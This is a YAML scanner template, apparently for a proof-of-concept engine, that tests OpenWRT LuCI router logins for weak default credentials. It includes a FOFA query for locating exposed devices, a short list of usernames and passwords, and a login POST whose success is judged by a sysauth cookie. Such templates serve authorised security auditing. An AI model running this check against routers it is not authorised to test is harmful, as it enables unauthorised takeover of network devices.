id: poc-yaml-openwrt-weak-password
info:
  name: OpenWRT 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: openwrt
  fofa: title="OpenWRT"
variables:
  username: 'root

    admin

    '
  passwd: 'admin

    password

    netflixcn.com

    '
firstRequest:
  method: GET
  path: /cgi-bin/luci/
  expression: contains(title,"OpenWrt")
requests:
- method: POST
  path: /cgi-bin/luci
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: luci_username=root&luci_password=password
  expression: status_code == 302 && body == "" && contains(headers,"sysauth=") &&
    contains(headers,"/cgi-bin/luci/")
transport: http
